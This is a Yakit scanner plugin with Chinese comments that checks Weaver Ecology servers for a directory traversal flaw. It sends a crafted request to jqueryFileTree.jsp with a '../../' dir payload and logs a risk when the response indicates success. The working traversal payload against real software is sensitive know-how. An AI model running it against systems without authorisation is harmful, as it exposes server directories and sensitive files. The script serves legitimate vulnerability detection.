# 泛微Ecology目录遍历漏洞检测
yakit.AutoInitYakit()

handleCheck = func(target, port) {
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    # 构造目录遍历的Payload
    payload = "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../"

    packet = `GET {{params(payload)}} HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: */*
Connection: close

`

    rsp, req, _ = poc.HTTP(
        packet,
        poc.params({"target": addr, "payload": payload}),
        poc.https(isTls),
        poc.redirectTimes(0),
    )

    # 判断条件：200响应、有Content-Length、无Error，并且响应长度足够
    if str.MatchAllOfSubString(rsp, `HTTP/1.1 200`) && 
       str.Contains(rsp, "Content-Length:") && 
       len(rsp) > 0 && 
       !str.Contains(rsp, "Error") {
        
        yakit.Info("%v 存在泛微Ecology目录遍历漏洞", addr)
        risk.NewRisk(
            addr,
            risk.title("泛微Ecology目录遍历漏洞"),
            risk.severity("medium"),
            risk.titleVerbose("泛微Ecology目录遍历漏洞（jqueryFileTree.jsp）"),
            risk.request(string(req)),
            risk.response(string(rsp)),
            risk.cve("无CVE"),
            risk.details("通过jqueryFileTree.jsp的dir参数可遍历服务器目录，可能导致敏感信息泄露"),
        )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    if !result.IsOpen() {
        return
    }

    if len(result.Fingerprint.HttpFlows) > 0 {
        handleCheck(result.Target, result.Port)
    }
}
